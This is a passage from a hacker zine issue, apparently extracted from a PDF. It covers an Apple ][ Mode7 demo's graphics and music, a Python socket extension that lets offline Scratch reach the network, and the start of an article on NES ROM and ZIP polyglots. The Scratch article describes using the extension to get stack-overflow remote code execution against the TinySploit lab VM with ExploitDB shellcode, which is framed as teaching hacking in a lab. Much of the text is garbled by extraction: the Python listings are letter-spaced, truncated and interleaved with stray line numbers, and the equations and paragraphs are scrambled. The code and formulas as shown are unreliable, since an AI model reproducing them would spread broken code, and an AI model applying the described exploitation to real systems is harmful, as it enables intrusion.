platform way to get the VBLANK info on Apple
][ machines, especially the older models.
Figure 3. The title screen.
Optimizing the code inside of a compressed im-
age (to fit in 8k) is much more complicated than reg-
ular size optimization. Removing instructions some-
times makes the binary larger as it no longer com-
presses as well. Long runs of a single value, such as
zero padding, are essentially free. This became an
exercise of repeatedly guessing and checking, until
everything fit.
Mockingbird Music
No demo is complete without some exciting back-
ground music. I like chiptune music, especially the
kind written for AY-3-8910 based systems. During
the long wait for my Mockingboard hardware to ar-
rive, I designed and built a Raspberry Pi chiptune
player that uses essentially the same hardware. This
allowed me to build up some expertise with the soft-
ware/hardware interface in advance.
The song being played is a stripped down and
re-arranged version of “Electric Wave” from CC’00
by EA (Ilya Abrosimov).
Most of my sound infrastructure involves YM5
files, a format commonly used by ZX Spectrum and
Atari ST users. The YM file format is just AY-3-
8910 register dumps taken at 50Hz. To play these
back one sets up the sound card to interrupt 50 times
a second and then writes out the fourteen register
values from each frame in an interrupt handler.
Writing out the registers quickly enough is a
challenge on the Apple ][, as for each register you
have to do a handshake and then set both the reg-
ister number and the value. It is hard to do this in
less than forty 1MHz cycles for each register. With
complex chiptune files (especially those written on
an ST with much faster hardware), sometimes it is
not possible to get exact playback due to the de-
lay. Further slowdown happens as you want to write
both AY chips (the output is stereo, with one AY on
the left and one on the right). To help with latency
on playback, we keep track of the last frame written
and only write to the registers that have changed.
The demo detects the Mockingboard in Slot 4
Title Screen
Once decompression is done, execution continues at
address $4000. We switch to low-res mode for the
rest of the demo.
FADE EFFECT: The title screen fades in from
black, which is a software hack as the Apple ][ does
not have palette support. This is done by loading
the image to an off-screen buffer and then a lookup
table is used to copy in the faded versions to the
image buffer on the fly.
TITLE GRAPHICS: The title screen is shown in
Figure 3. The image is run-length encoded (RLE)
which is probably unnecessary in light of it being
further LZ4 encoded. (LZ4 compression was a late
addition to this endeavor.)
Why not save some space and just loading our
demo at $400, negating the need to copy the im-
age in place? Remember the graphics are 40 × 48
(shared with the text display region). It might be
easier to think of it as 40 × 24 characters, with the
top / bottom nybbles of each ASCII character be-
ing interpreted as colors for a half-height block. If
you do the math you will find this takes 960 bytes
of space, but the memory map reserves 1k for this
6at startup. First the board is initialized, then one
of the 6522 timers is set to interrupt at 25Hz. Why
25Hz and not 50Hz? At 50Hz with fourteen registers
you use 700 bytes/s. So a two minute song would
take 84k of RAM, which is much more than is avail-
able! To allow the song to fit in memory, without a
fancy circular buffer decompression routine, we have
to reduce the size. 3
First the music is changed so it only needs to be
updated at 25Hz, and then the register data is com-
pressed from fourteen bytes to eleven bytes by strip-
ping off the envelope effects and packing together
fields that have unused bits. In the end the sound
quality suffered a bit, but we were able to fit an ac-
ceptably catchy chiptune inside of our 8k payload.
The leftmost position in the tile lookup is calculated:

width 
∆x
tilex = x + d cos(angle) −
2

width 
∆y
tiley = y + d sin(angle) −
2
Then an inner loop happens that adds ∆x and ∆y as
we lookup the color from the tilemap (just a wrap-
around array lookup) for each block on the line.
color = tilelookup(tilex, tiley)
plot(x, y)
tilex += ∆x, tiley += ∆y
Drawing the Mode7 Background
Optimizations: The 6502 processor cannot do
floating point, so all of our routines use 8.8 fixed
point math. We eliminate all use of division, and
convert as much as possible to table lookups, which
involves limiting the heights and angles a bit.
Some cycles are also saved by using self-
modifying code, most notably hard-coding the
height (z) value and modifying the code whenever
this is changed. The code started out only capable
of roughly 4.9fps in 40 × 20 resolution and in the
end we improved this to 5.7fps in 40 × 40 resolution.
Care was taken to optimize the innermost loop, as
every cycle saved there results in 1280 cycles saved
overall.
Mode 7 is a Super Nintendo (SNES) graphics mode
that takes a tiled background and transforms it
by rotating and scaling. The most common effect
squashes the background out to the horizon, giv-
ing a three-dimensional look. The SNES did these
transforms in hardware, but our demo must do them
in software.
Our algorithm is based on code by Martijn van
Iersel which iterates through each horizontal line on
the screen and calculates the color to output based
on the camera height (spacez) and angle as well as
the current coordinates, x and y.
First, the distance d is calculated based on fixed
scale and distance-to-horizon factors. Instead of a
costly division operation, we use a pre-generated
lookup table for this.
d =
Fast Multiply: One of the biggest bottlenecks in
the mode7 code was the multiply. Even our opti-
mized algorithm calls for at least seven 16-bit by
16-bit to 32-bit multiplies, something that is really
slow on the 6502. A typical implementation takes
around 700 cycles for an 8.8 × 8.8 fixed point multi-
ply.
We improved this by using the ancient quarter-
square multiply algorithm, first described for 6502
use by Stephen Judd.
This works by noting these factorizations:
z × yscale
y + horizon
Next we calculate the horizontal scale (distance be-
tween points on this line):
h =
d
xscale
(a + b) 2 = a 2 + 2ab + b 2
Then we calculate delta x and delta y values between
each block on the line. We use a pre-computed sine/-
cosine lookup table.
(a − b) 2 = a 2 − 2ab + b 2
If you subtract these you can simplify to
∆x = − sin(angle) × h
3 For
a × b =
∆y = cos(angle) × h
an example of such a routine, see my Chiptune music-disk demo.
7
(a + b) 2
(a − b) 2
−
4
4were reduced to the proper size and color limita-
tions. The shadows are also sprites, and as the Ap-
ple ][ has no dedicated sprite hardware, these are
drawn completely in software.
The clicking noise on bounce is generated by ac-
cessing the speaker port at address $C030. This
gives some sound for those viewing the demo with-
out the benefit of a Mockingboard.
TFV SPACESHIP FLYING
This next scene has a spaceship flying over an is-
land. The Mode7 graphics code is generic enough
that only one copy of the code is needed to generate
both the checkerboard and island scenes. The space-
ship, water splash, and shadows are all sprites. The
path the ship takes is pre-recorded; this is adapted
from the Talbot Fantasy 7 game engine with the
keyboard code replaced by a hard-coded script of
actions to take.
Figure 4. Bouncing ball on infinite checkerboard.
Figure 5. Spaceship flying over an island.
For 8-bit values if you create a table of squares
from 0 to 511, then you can convert a multiply
into two table lookups and a subtraction. 4 This
does have the downside of requiring two kilobytes
of lookup tables, but it reduces the multiply cost to
the order of 250 cycles or so and these tables can be
generated at startup.
BALL ON CHECKERBOARD
The first Mode7 scene transpires on an infinite
checkerboard. A demo would be incomplete with-
out some sort of bouncing geometric solid, in this
case we have a pink sphere. The sphere is repre-
sented by sixteen sprites that were captured from
a twenty year old OpenGL example. Screenshots
4 All
8-bit a + b and a − b fall in this range.
8The star positions require random number gener-
ation, but there is no easy way to quickly get random
data on the Apple ][. Originally we had a 256-byte
blob of pre-generated “random” values included in
the code. This wasted space, so instead we use our
own machine code at address at $5000 as if it were
a block of random numbers!
A simple state machine controls star speed, ship
movement, hyperspace, background color (for the
blue flash) and the eventual sequence of sprites as
the ship vanishes into the distance.
RASTERBARS/CREDITS
Once the ship has departed, it is time to run the
credits as the stars continue to fly by.
The text is written to the bottom four lines of the
screen, seemingly surrounded by graphics blocks.
Mixed graphics/text is generally not be possible on
the Apple ][, although with careful cycle counting
and mode switching groups such as FrenchTouch
have achieved this effect. What we see in this demo
is the use of inverse-mode (inverted color) space
characters which appear the same as white graphics
blocks.
The rasterbar effect is not really rasterbars, just
a colorful assortment of horizontal lines drawn at a
location determined with a sine lookup table. Hori-
zontal lines can take a surprising amount of time to
draw, but these were optimized using inlining and a
few other tricks.
The spinning text is done by just rapidly rotating
the output string through the ASCII table, with the
clicking effect again generated by hitting the speaker
at address $C030. The list of people to thank ended
up being the primary limitation to fitting in 8kB, as
unique text strings do not compress well. I apologize
to everyone whose moniker got compressed beyond
recognition, and I am still not totally happy with
the centering of the text.
Figure 6. Spaceship with starfield.
Figure 7. Rasterbars, stars, and credits.
STARFIELD
The spaceship now takes to the stars. This is typical
starfield code, where on each iteration the x and y
values are changed by
x
y
∆x = , ∆y =
z
z
In order to get a good frame rate and not clutter
the lo-res screen only sixteen stars are modeled. To
avoid having to divide, the reciprocal of all possible
z values are stored in a table, and the fast-multiply
routine described previously is used.
5 unzip
A Parting Gift
Further details, a prebuilt disk image, and full
source code are available both online and attached
to the electronic version of this document. 5 6
pocorgtfo18.pdf mode7.tar.gz
6 http://www.deater.net/weave/vmwprod/mode7_demo/
918:03
Fun Memory Corruption Exploits for Kids with Scratch!
by Kev Sheldrake
Introduction
When my son graduated from Scratch Junior on the
iPad to full-blown Scratch on a desktop computer, I
opted to protect the Internet from him by not giving
him a network interface. Instead I installed the of-
fline version of Scratch on his computer that works
completely stand-alone. One of the interesting dif-
ferences between the online and offline versions of
Scratch is the way in which it can be extended; the
offline version will happily provide an option to in-
stall an ‘Experimental HTTP Extension’ if you use
the super-secret ‘shift click’ on the File menu instead
of the regular, common-all-garden ‘click’.
These extensions allow Scratch to communicate
with another process outside the sandbox through a
web service; there is an abandoned Python mod-
ule that provides a suitable framework for build-
ing them. While words like ‘experimental’ and ‘a-
bandoned’ don’t appear to offer much hope, this is
all just a facade and the technology actually works
pretty well. Indeed, we have interfaced Scratch to
Midi, Arduino projects and, as this essay will ex-
plain, TCP/IP network sockets because, well, if a
language exists to teach kids how to code then I
think it [c|sh]ould also be used to teach them how
to hack.
All code lives behind sprites or the stage (back-
ground); it can sense key presses, mouse clicks,
sprites touching, etc, and can move sprites and
change their size, colour, etc. If you ever wanted
to recreate that crappy flash game you played in
the late 90s at university or in your first job then
Scratch is perfect for that. You could probably get
something that looks suitably pro within an after-
noon or less. Don’t be fooled by the fact it was
made for kids, Scratch can make some pretty cool
things and is fun; but also be aware that it has its
limitations, and lack of networking is one of them.
The offline version of Scratch relies on Adobe Air
which has been abandoned on Linux. An older 32-
bit version can be installed, but you’ll have much
better results if you just try this on Windows or
MacOS.
Scratch Basics
Scratch Extensions
If you’re not already aware, Scratch is an IDE and a
language, all wrapped up in a sandbox built out of
Squeak/Smalltalk (v1.0 to v1.4), Flash/Adobe Air
(v2.0) and HTML5/Javascript (v3.0). Within it,
sprite-based programs can be written using prim-
itives that resemble jigsaw pieces that constrain
where or how they can be placed. For example, an
IF/THEN primitive requires a predicate operator,
such as X=Y or X>Y; in Scratch, predicates have
angled edges and only fit in places where predicates
are accepted. This makes it easier for children to
learn how to combine primitives to make statements
and eventually programs.
Extensions were introduced in Scratch v2.0 and dif-
fer between the online and offline versions. For the
online version extensions are coded in JS, stored on
github.io and accessed via the ScratchX version of
Scratch. As I had limited my son to the offline ver-
sion, we were treated to web service extensions built
in Python.
On the face of it a web service seems like an obvi-
ous choice because they are easy to build, are asyn-
chronous by nature and each method can take multi-
ple arguments. In reality, this extension model was
actually designed for controlling things like robot
arms rather than anything generic. There are com-
mands and reporters, each represented in Scratch
as appropriate blocks; commands would move robot
motors and reporters would indicate when motor
limits are hit. To put these concepts into more stan-
dard terms, commands are essentially procedures.
10They take arguments but provide no responses, and
reporters are essentially global variables that can be
affected by the procedures. If you think this is a
weird model to program in then you’d be correct.
In order to quickly and easily build a suitable
web service, we can use the off-the-shelf abandon-
ware, Blockext. 7 This is a python module that pro-
vides the full web service functionality to an object
that we supply. It’s relatively trivial to build meth-
ods that create sockets, write to sockets, and close
sockets, as we can get away without return values.
To implement methods that read from sockets we
need to build a command (procedure) that does the
actual read, but puts the data into a global variable
that can be read via a reporter.
At this point it is worth discussing how these re-
porters / global variables actually function. They
are exposed via the web service by simply report-
ing their values thirty times a second. That’s right,
thirty times a second. This makes them great for
motor limit switches where data is minimal but la-
tency is critical, but less great at returning data
from sockets. Still, as my hacky extension shows,
if their use is limited they can still work. The block-
ext console doesn’t log reporter accesses but a web
proxy can show them happening if you’re interested
in seeing them.
7 git
clone https://github.com/blockext/blockext
11Scratch Limitations
While Scratch can handle binary data, it doesn’t re-
ally have a way to input it, and certainly no C-style
or pythonesque formatting. It also has no complex
data types; variables can be numbers or strings, but
the language is probably Turing-complete so this
shouldn’t really stop us. There is also no random
access into strings or any form of string slicing; we
can however retrieve a single letter from a string by
position.
Strings can be constructed from a series of joins,
and we can write a python handler to convert from
an ASCIIfied format (such as ‘\xNN’) to regular bi-
nary. Stripping off newlines on returned strings re-
quires us to build a new (native) Scratch block. Just
like the python blocks accessible through the web
service, these blocks are also procedures with no re-
turn values. We are therefore constrained to return-
ing values via (sprite) global variables, which means
we have to be careful about concurrency.
Talking of concurrency, Scratch has a handy
message system that can be used to create paral-
lel processing. As highlighted, however, the lack of
functions and local variables means we can easily
run into problems if we’re not careful.
Blockext
The Python blockext module can be obtained from
its GitHub and installed with a simple sudo python
setup.py install.
My socket extension is quite straight forward.
The definition of the object is mostly standard
socket code; while it has worked in my limited test-
ing, feel free to make it more robust for any produc-
tion use—this is just a PoC after all.
121 #! / u s r / b i n / p y t h o n
3
5
7
9
11
13
from b l o c k e x t
import s o c k e t
import s e l e c t
import u r l l i b
import b a s e 6 4
import ∗
class SSocket :
d e f __init__ ( s e l f ) :
s e l f . s o c k e t s = {}
def _on_reset ( s e l f ) :
print ’ r e s e t ! ! ! ’
f o r key in s e l f . s o c k e t s . k e y s ( ) :
i f s e l f . s o c k e t s [ key ] [ ’ s o c k e t ’ ] :
s e l f . s o c k e t s [ key ] [ ’ s o c k e t ’ ] . c l o s e ( )
s e l f . s o c k e t s = {}
def a d d _ s o c k e t ( s e l f , type , p r o t o , s o c k , h o s t , p o r t ) :
i f s e l f . i s _ c o n n e c t e d ( s o c k ) or s e l f . i s _ l i s t e n i n g ( s o c k ) :
print ’ add_socket : s o c k e t a l r e a d y i n use ’
return
s e l f . s o c k e t s [ s o c k ] = { ’ t y p e ’ : type , ’ p r o t o ’ : p r o t o , ’ h o s t ’ :
def s e t _ s o c k e t ( s e l f , sock , s ) :
i f not s e l f . i s _ c o n n e c t e d ( s o c k ) and not
print ’ set_socket : s o c k e t doesn \ ’ t
return
s e l f . sockets [ sock ] [ ’ socket ’ ] = s
15
17
19
21
23
host ,
’ port ’ :
port ,
’ reading ’ :
25
27
29
s e l f . i s _ l i s t e n i n g ( sock ) :
exist ’
31
def s e t _ c o n t r o l ( s e l f , sock , c ) :
i f not s e l f . i s _ c o n n e c t e d ( s o c k ) and not s e l f . i s _ l i s t e n i n g ( s o c k ) :
print ’ s e t _ c o n t r o l : s o c k e t doesn \ ’ t e x i s t ’
return
s e l f . sockets [ sock ] [ ’ c o n t r o l ’ ] = c
def set_addr ( s e l f , sock , a ) :
i f not s e l f . i s _ c o n n e c t e d ( s o c k ) and not s e l f . i s _ l i s t e n i n g ( s o c k ) :
print ’ set_addr : s o c k e t doesn \ ’ t e x i s t ’
return
s e l f . s o c k e t s [ s o c k ] [ ’ addr ’ ] = a
def c r e a t e _ s o c k e t ( s e l f , proto , sock , host , port ) :
i f s e l f . i s _ c o n n e c t e d ( s o c k ) or s e l f . i s _ l i s t e n i n g ( s o c k ) :
print ’ c r e a t e _ s o c k e t : s o c k e t a l r e a d y in use ’
return
s = s o c k e t . s o c k e t ( s o c k e t . AF_INET, s o c k e t .SOCK_STREAM)
s . connect ( ( host , port ) )
s e l f . add_socket ( ’ s o c k e t ’ , proto , sock , host , p o r t )
s e l f . s e t _ s o c k e t ( sock , s )
def c r e a t e _ l i s t e n e r ( s e l f , proto , sock , ip , port ) :
i f s e l f . i s _ c o n n e c t e d ( s o c k ) or s e l f . i s _ l i s t e n i n g ( s o c k ) :
print ’ c r e a t e _ l i s t e n e r : s o c k e t a l r e a d y in use ’
return
s = socket . socket ()
s . bind ( ( ip , port ) )
s . l i s t e n (5)
s e l f . add_socket ( ’ l i s t e n e r ’ , proto , sock , ip , p o r t )
s e l f . s e t _ c o n t r o l ( sock , s )
def accept_connection ( s e l f , sock ) :
i f not s e l f . i s _ l i s t e n i n g ( s o c k ) :
print ’ accept_connection : s o c k e t
return
s = s e l f . sockets [ sock ] [ ’ c o n t r o l ’ ]
c , addr = s . a c c e p t ( )
s e l f . s e t _ s o c k e t ( sock , c )
s e l f . set_addr ( sock , addr )
33
35
37
39
41
43
45
47
49
51
53
55
57
59
61
63
65
67
69
is
not
listening ’
71
def close_socket ( s e l f , sock ) :
i f s e l f . i s _ c o n n e c t e d ( s o c k ) or s e l f . i s _ l i s t e n i n g ( s o c k ) :
s e l f . sockets [ sock ] [ ’ socket ’ ] . c l o s e ()
del s e l f . s o c k e t s [ sock ]
def is_connected ( s e l f , sock ) :
i f sock in s e l f . s o c k e t s :
i f s e l f . s o c k e t s [ s o c k ] [ ’ t y p e ’ ] == ’ s o c k e t ’ and not
return True
return F a l s e
73
75
77
79
81
83
def i s _ l i s t e n i n g ( s e l f , sock ) :
i f sock in s e l f . s o c k e t s :
i f s e l f . s o c k e t s [ s o c k ] [ ’ t y p e ’ ] == ’ l i s t e n e r ’ :
return True
return F a l s e
def w r i t e _ s o c k e t ( s e l f , d a t a , type , s o c k ) :
i f not s e l f . i s _ c o n n e c t e d ( s o c k ) and not s e l f . i s _ l i s t e n i n g ( s o c k ) :
print ’ write_socket : s o c k e t doesn \ ’ t e x i s t ’
return
i f not ’ s o c k e t ’ i n s e l f . s o c k e t s [ s o c k ] or s e l f . s o c k e t s [ s o c k ] [ ’ c l o s e d ’ ] :
print ’ write_socket : s o c k e t fd doesn \ ’ t e x i s t ’
return
buf = ’ ’
i f type == " raw " :
buf = data
e l i f type == " c e n c " :
buf = data . decode ( ’ s t r i n g _ e s c a p e ’ )
e l i f type == " u r l e n c " :
buf = u r l l i b . unquote ( data )
85
87
89
91
93
95
97
99
101
s e l f . sockets [ sock ] [ ’ c l o s e d ’ ] :
13
0,
’ closed ’ :
0}103
elif
type == " b a s e 6 4 " :
buf = base64 . b64decode ( data )
105
totalsent = 0
while t o t a l s e n t < len ( buf ) :
s e n t = s e l f . s o c k e t s [ sock ] [ ’ s o c k e t ’ ] . send ( buf [ t o t a l s e n t : ] )
i f s e n t == 0 :
s e l f . sockets [ sock ] [ ’ c l o s e d ’ ] = 1
return
t o t a l s e n t += s e n t
107
109
111
113
def clear_read_flag ( s e l f , sock ) :
i f not s e l f . i s _ c o n n e c t e d ( s o c k ) and not s e l f . i s _ l i s t e n i n g ( s o c k ) :
print ’ r e a d l i n e _ s o c k e t : s o c k e t doesn \ ’ t e x i s t ’
return
i f not ’ s o c k e t ’ i n s e l f . s o c k e t s [ s o c k ] :
print ’ r e a d l i n e _ s o c k e t : s o c k e t fd doesn \ ’ t e x i s t ’
return
s e l f . sockets [ sock ] [ ’ reading ’ ] = 0
def reading ( s e l f , sock ) :
i f not s e l f . i s _ c o n n e c t e d ( s o c k ) and not s e l f . i s _ l i s t e n i n g ( s o c k ) :
return 0
i f not ’ r e a d i n g ’ i n s e l f . s o c k e t s [ s o c k ] :
return 0
return s e l f . s o c k e t s [ s o c k ] [ ’ r e a d i n g ’ ]
def readline_socket ( s e l f , sock ) :
i f not s e l f . i s _ c o n n e c t e d ( s o c k ) and not s e l f . i s _ l i s t e n i n g ( s o c k ) :
print ’ r e a d l i n e _ s o c k e t : s o c k e t doesn \ ’ t e x i s t ’
return
i f not ’ s o c k e t ’ i n s e l f . s o c k e t s [ s o c k ] or s e l f . s o c k e t s [ s o c k ] [ ’ c l o s e d ’ ] :
print ’ r e a d l i n e _ s o c k e t : s o c k e t fd doesn \ ’ t e x i s t ’
return
s e l f . sockets [ sock ] [ ’ reading ’ ] = 1
str = ’ ’
c = ’ ’
w h i l e c != ’ \ n ’ :
read_sockets , write_s , error_s = s e l e c t . s e l e c t ( [ s e l f . s o c k e t s [ sock ] [ ’ s o c k e t ’ ] ]
i f read_sockets :
c = s e l f . sockets [ sock ] [ ’ socket ’ ] . recv (1)
s t r += c
i f c == ’ ’ :
s e l f . sockets [ sock ] [ ’ c l o s e d ’ ] = 1
c = ’ \ n ’ # end t h e w h i l e l o o p
else :
c = ’ \ n ’ # end t h e w h i l e l o o p w i t h empty o r p a r t i a l l y r e c e i v e d s t r i n g
s e l f . sockets [ sock ] [ ’ readbuf ’ ] = str
i f str :
s e l f . sockets [ sock ] [ ’ reading ’ ] = 2
else :
s e l f . sockets [ sock ] [ ’ reading ’ ] = 0
115
117
119
121
123
125
127
129
131
133
135
137
139
141
143
145
147
149
151
153
, [] , [] ,
[] , [] , 0.1)
155
def
157
159
161
163
165
167
169
recv_socket ( s e l f , length , sock ) :
i f not s e l f . i s _ c o n n e c t e d ( s o c k ) and not s e l f . i s _ l i s t e n i n g ( s o c k ) :
print ’ recv_socket : s o c k e t doesn \ ’ t e x i s t ’
return
i f not ’ s o c k e t ’ i n s e l f . s o c k e t s [ s o c k ] or s e l f . s o c k e t s [ s o c k ] [ ’ c l o s e d ’ ] :
print ’ recv_socket : s o c k e t fd doesn \ ’ t e x i s t ’
return
s e l f . sockets [ sock ] [ ’ reading ’ ] = 1
read_sockets , write_s , error_s = s e l e c t . s e l e c t ( [ s e l f . s o c k e t s [ sock ] [ ’ s o c k e t ’ ] ]
i f read_sockets :
str = s e l f . sockets [ sock ] [ ’ socket ’ ] . recv ( length )
i f s t r == ’ ’ :
s e l f . sockets [ sock ] [ ’ c l o s e d ’ ] = 1
else :
str = ’ ’
171
s e l f . sockets [ sock ] [ ’ readbuf ’ ] = str
i f str :
s e l f . sockets [ sock ] [ ’ reading ’ ] = 2
else :
s e l f . sockets [ sock ] [ ’ reading ’ ] = 0
173
175
177
def n_read ( s e l f , s o c k ) :
i f not s e l f . i s _ c o n n e c t e d ( s o c k ) and not s e l f . i s _ l i s t e n i n g ( s o c k ) :
return 0
i f s e l f . s o c k e t s [ s o c k ] [ ’ r e a d i n g ’ ] == 2 :
return l e n ( s e l f . s o c k e t s [ s o c k ] [ ’ r e a d b u f ’ ] )
else :
return 0
def r e a d b u f ( s e l f , type , s o c k ) :
i f not s e l f . i s _ c o n n e c t e d ( s o c k ) and not s e l f . i s _ l i s t e n i n g ( s o c k ) :
return ’ ’
i f s e l f . s o c k e t s [ s o c k ] [ ’ r e a d i n g ’ ] == 2 :
data = s e l f . s o c k e t s [ sock ] [ ’ readbuf ’ ]
buf = ’ ’
i f type == " raw " :
buf = data
e l i f type == " c e n c " :
buf = data . encode ( ’ s t r i n g _ e s c a p e ’ )
e l i f type == " u r l e n c " :
buf = u r l l i b . quote ( data )
e l i f type == " b a s e 6 4 " :
buf = base64 . b64encode ( data )
return b u f
else :
return ’ ’
179
181
183
185
187
189
191
193
195
197
199
201
14
,
0.1)The final section is simply the description of the
blocks that the extension makes available over the
web service to Scratch. Each block line takes 4 ar-
guments: the Python function to call, the type of
block (command, predicate or reporter), the text
description that the Scratch block will present (how
it will look in Scratch), and the default values. For
reference, predicates are simply reporter blocks that
only return a boolean value.
2
4
6
8
10
12
14
16
18
20
22
24
26
28
30
32
34
36
The text description includes placeholders for
the arguments to the Python function: %s for a
string, %n for a number, and %m for a drop-down
menu. All %m arguments are post-fixed with the
name of the menu from which the available values
are taken. The actual menus are described as a dic-
tionary of named lists.
Finally, the object is linked to the description
and the web service is then started. This Python
script is launched from the command line and will
start the web service on the given port.
descriptor = Descriptor (
name = " S c r a t c h S o c k e t s " ,
port = 5000 ,
blocks = [
Block ( ’ c r e a t e _ s o c k e t ’ , ’ command ’ , ’ c r e a t e %m. p r o t o conx %m. s o c k n o h o s t %s p o r t %n ’ ,
d e f a u l t s =[ " t c p " , 1 , " 1 2 7 . 0 . 0 . 1 " , 0 ] ) ,
Block ( ’ c r e a t e _ l i s t e n e r ’ , ’ command ’ ,
’ c r e a t e %m. p r o t o l i s t e n e r %m. s o c k n o i p %s p o r t %n ’ ,
d e f a u l t s =[ " t c p " , 1 , " 0 . 0 . 0 . 0 " , 0 ] ) ,
Block ( ’ a c c e p t _ c o n n e c t i o n ’ , ’ command ’ , ’ a c c e p t c o n n e c t i o n %m. s o c k n o ’ ,
defaults =[1]) ,
Block ( ’ c l o s e _ s o c k e t ’ , ’ command ’ , ’ c l o s e s o c k e t %m. s o c k n o ’ ,
defaults =[1]) ,
Block ( ’ i s _ c o n n e c t e d ’ , ’ p r e d i c a t e ’ , ’ s o c k e t %m. s o c k n o c o n n e c t e d ? ’ ) ,
Block ( ’ i s _ l i s t e n i n g ’ , ’ p r e d i c a t e ’ , ’ s o c k e t %m. s o c k n o l i s t e n i n g ? ’ ) ,
Block ( ’ w r i t e _ s o c k e t ’ , ’ command ’ , ’ w r i t e %s a s %m. e n c o d i n g t o s o c k e t %m. s o c k n o ’ ,
d e f a u l t s =[ " h e l l o " , " raw " , 1 ] ) ,
Block ( ’ r e a d l i n e _ s o c k e t ’ , ’ command ’ , ’ r e a d l i n e from s o c k e t %m. s o c k n o ’ ,
defaults =[1]) ,
Block ( ’ r e c v _ s o c k e t ’ , ’ command ’ , ’ r e a d %n b y t e s from s o c k e t %m. s o c k n o ’ ,
d e f a u l t s =[255 , 1 ] ) ,
Block ( ’ n_read ’ , ’ r e p o r t e r ’ , ’ n_read from s o c k e t %m. s o c k n o ’ ,
defaults =[1]) ,
Block ( ’ r e a d b u f ’ , ’ r e p o r t e r ’ , ’ r e c e i v e d b u f a s %m. e n c o d i n g from s o c k e t %m. s o c k n o ’ ,
d e f a u l t s =[ " raw " , 1 ] ) ,
Block ( ’ r e a d i n g ’ , ’ r e p o r t e r ’ , ’ r e a d f l a g f o r s o c k e t %m. s o c k n o ’ ,
defaults =[1]) ,
Block ( ’ c l e a r _ r e a d _ f l a g ’ , ’ command ’ , ’ c l e a r r e a d f l a g f o r s o c k e t %m. s o c k n o ’ ,
defaults =[1]) ,
],
menus = d i c t (
p r o t o = [ " t c p " , "udp" ] ,
e n c o d i n g = [ " raw " , " c enc " , " u r l enc " , " b a s e 6 4 " ] ,
sockno = [ 1 , 2 , 3 , 4 , 5 ] ,
),
)
38 e x t e n s i o n = E x t e n s i o n ( SSocket , d e s c r i p t o r )
40 i f __name__ == ’__main__ ’ :
e x t e n s i o n . r u n _ f o r e v e r ( debug=True )
15Linking into Scratch
Scratch is a great language/IDE to teach cod-
ing to children. Once they’ve successfully built a
racing game and a PacMan clone, it can also be
used to teach them to interact with the world out-
side of Scratch. As I mentioned in the introduc-
tion, we’ve interfaced Scratch to Midi and Arduino
projects from where a whole world opens up. The
above screen shots show how it can also be inter-
faced to a simple TCP/IP socket extension to allow
interaction with anything on the network.
From here it is possible to cause buffer over-
flows that lead to crashes and, through standard
stack-smashing techniques, to remote code execu-
tion. When I was a child, Z-80 assembly was the
second language I learned after BASIC on a ZX
Spectrum. (The third was 8086 funnily enough!)
I hunted for infinite lives and eventually became a
reasonable C programmer. Perhaps with a (slightly
better) socket extension, Scratch could become a
gateway to x86 shell code. I wonder whether IT
teachers would agree?
The web service provides the required web ser-
vice description file from its index page. Simply
browse to http://localhost:5000 and download
the Scratch 2 extension file (Scratch Scratch Sock-
ets English.s2e). To load this into Scratch we need
to use the super-secret ‘shift click’ on the File menu
to reveal the ‘Import experimental HTTP extension’
option. Navigate to the s2e file and the new blocks
will appear under ‘More Blocks’.
Fuzzing, crashing, controlling EIP, and
exploiting
In order to demonstrate the use of the extension,
I obtained and booted the TinySploit VM from
Saumil Shah’s ExploitLab, and then used the given
stack-based overflow to gain remote code execution.
The details are straight forward; the shell code by
Julien Ahrens came from ExploitDB and was modi-
fied to execute Busybox correctly. 8 Scratch projects
are available as an attachment to this PDF. 9
—Kev Sheldrake
8 https://www.exploit-db.com/exploits/43755/
9 unzip
pocorgtfo18.pdf scratchexploits.zip
1618:04
Concealing ZIP Files in NES Cartridges
by Vi Grey
Hello, neighbors.
Numbers and ranges included in figures in this
article will be in Hexadecimal. Range values are big-
endian and ranges work the same as Python slices,
where [x:y] is the range of x to, but not including,
y.
This story begins with the fantastic work de-
scribed in PoCkGTFO 14:12, which presented
an NES ROM that was also a PDF. That file,
pocorgtfo14.pdf, was by coincidence also a ZIP
file. That issue inspired me to learn 6502 Assembly,
develop an NES game from scratch, and burn it onto
a physical cartridge for the #tymkrs.
iNES File Format
This article focuses on the iNES file format. This
is because, as was described in PoCkGTFO 14:12,
iNES is essentially the de facto standard for NES
ROM files. Figure 8 shows the structure of an NES
ROM in the iNES file format that fits on an NROM-
128 cartridge. 10
The first sixteen bytes of the file MUST be the
iNES Header, which provides information for NES
Emulators to figure out how to play the ROM.
Following the iNES Header is the 16 KiB PRG
ROM. If the PRG ROM data doesn’t fill up that en-
tire 16 KiB, then the PRG ROM will be padded. As
long as the PRG padding isn’t actually being used,
it can be any byte value, as that data is completely
ignored. The final six bytes of the PRG ROM data
are the interrupt vectors, which are required.
Eight kilobytes of CHR ROM data follows the
PRG ROM.
During development, I noticed that the unused
game space was just being used as padding and that
any data could be placed in that padding. Although
I ended up using that space for something else in the
game, I realized that I could use padding space to
make an NES ROM that is also a ZIP file. This
polyglot file wouldn’t make the NES ROM any big-
ger than it originally was. I quickly got to work on
this idea.
The method described in this article to create an
NES + ZIP polyglot file is different from that which
was used in PoCkGTFO 14:12. In that method,
none of the ZIP file data is saved inside the NES
ROM itself. My method is able to retain the ZIP
file data, even when it burned onto a cartridge. If
you rip the data off of a cartridge, the resulting NES
ROM file will still be an NES + ZIP polyglot file.
Start of iNES File
iNES Header [0000:0010]
PRG ROM [0010:4010]
PRG Padding [XXxx:400A]
PRG Interrupt Vectors [400A:4010]
CHR ROM
[4010:6010]
Figure 8. iNES File Format
10 NROM-128
is a board that does not use a mapper and only allows a PRG ROM size of 16 KiB.
1718ZIP File Format Central Directory File Headers
There are two things in the ZIP file format that we
need to focus on to create this polyglot file, the End
of Central Directory Record and the Central Direc-
tory File Headers. For every file or directory that is zipped in the ZIP
file, a Central Directory File Header exists. The
parts we care about are shown in Figure 10.
Each Central Directory File Header starts with
the four-byte big-endian signature 504B0102.
38 bytes after the signature is a four-byte Lo-
cal Header Offset, which specifies how far from the
beginning of the file the corresponding local header
is.
End of Central Directory Record
To find the data of a ZIP file, a ZIP file extractor
should start searching from the back of the file to-
wards the front until it finds the End of Central Di-
rectory Record. The parts we care about are shown
in Figure 9.
The End of Central Directory Record begins
with the four-byte big-endian signature 504B0506.
Twelve bytes after the end of the signature is
the four-byte Central Directory Offset, which states
how far from the beginning of the file the start of
the Central Directory will be found.
The following two bytes state the ZIP file com-
ment length, which is how many bytes after the ZIP
file data the ZIP file comment will be found. Two
bytes for the comment length means we have a maxi-
mum length value of 65,535 bytes, more than enough
space to make our polyglot file.
